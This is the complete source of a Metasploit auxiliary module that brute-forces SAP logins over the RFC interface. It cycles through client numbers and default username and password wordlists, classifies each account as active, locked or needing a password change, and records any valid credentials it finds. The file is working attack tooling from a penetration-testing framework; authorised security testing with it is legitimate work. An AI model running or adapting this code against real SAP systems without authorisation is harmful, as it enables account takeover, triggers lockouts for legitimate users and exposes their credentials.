##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name' => 'SAP RFC Brute Forcer',
      'Description'    => %q{
        This module attempts to brute force the username | password via an RFC interface.
        Default clients can be tested without needing to set a CLIENT.
        Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
        The default usernames and password combinations are stored in ./data/wordlists/sap_rfc_common.txt.
        This module can execute through a SAP Router if SRHOST and SRPORT values are set.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => ['nmonkee'],
      'License'        => BSD_LICENSE
    )

    register_options(
    [
      OptString.new('CLIENT', [true, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
      OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
        File.join(Msf::Config.data_directory, "wordlists", "sap_default.txt") ])
    ], self.class)
  end

  def run_host(rhost)
    saptbl = Msf::Ui::Console::Table.new(
              Msf::Ui::Console::Table::Style::Default,
              'Header'  => "[SAP] Credentials #{rhost}:#{rport}",
              'Columns' =>
                [
                  "host",
                  "port",
                  "client",
                  "user",
                  "pass",
                  "status"
                ])

    client_list.each do |client|
      print_status("#{rhost}:#{rport} [SAP] Trying client: #{client}")
      each_user_pass do |user, password|
        vprint_status("#{rhost}:#{rport} [SAP] Trying #{client}:#{user}:#{password}")
        begin
          status = brute_user(user,
                              client,
                              password,
                              rhost,
                              rport)
        rescue NWError
          break
        end

        if status
          print_good("#{rhost}:#{rport} [SAP] Client #{client}, valid credentials #{user}:#{password} - #{status}")
          saptbl << [rhost, rport, client, user, password, status]
          report_auth_info(
            :host => rhost,
            :sname => 'sap-gateway',
            :proto => 'tcp',
            :port => rport,
            :client => client,
            :user => user,
            :pass => password,
            :sysnr => system_number,
            :source_type => "user_supplied",
            :target_host => rhost,
            :target_port => rport
          )
        end
      end
    end

    if saptbl.rows.count > 0
      print(saptbl.to_s)
    end
  end

  def brute_user(username, client, password, rhost, rport)
    status = nil
    begin
      login(rhost, rport, client, username, password) do |conn|
        status = 'active'
      end
    rescue NWError => e
      case e.message
      when /not available in this system/i
        vprint_error("#{rhost}:#{rport} [SAP] #{e.message} - skipping client")
        raise e
      when /Password must be changed/i
        status = 'pass change'
      when /Password logon no longer possible - too many failed attempts/i
        status =  'locked'
      end
    end

    status
  end
end

